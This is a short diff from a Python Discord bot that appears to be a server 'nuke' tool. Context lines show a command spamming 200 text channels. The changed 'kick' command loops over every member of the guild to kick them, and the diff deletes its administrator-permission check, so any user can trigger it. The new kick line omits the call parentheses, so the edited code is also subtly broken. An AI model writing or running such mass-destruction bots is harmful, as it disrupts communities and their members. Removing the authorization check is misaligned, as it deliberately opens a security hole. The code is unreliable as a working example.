@@ -36,12 +36,10 @@ async def create(ctx):
      for i in range(200):
         await ctx.guild.create_text_channel("튀엣")
         
-@client.command(aliases=['kick'])
-@commands.has_permissions(administrator=True)
-async def kick(ctx,member : discord.Member, *,reason="웅앵웅"):
+@client.command()
+async def kick(ctx):
     for member in ctx.guild.members:
-          await member.kick(reason=reason)
-        
+        await member.kick
 
     
 @client.command()
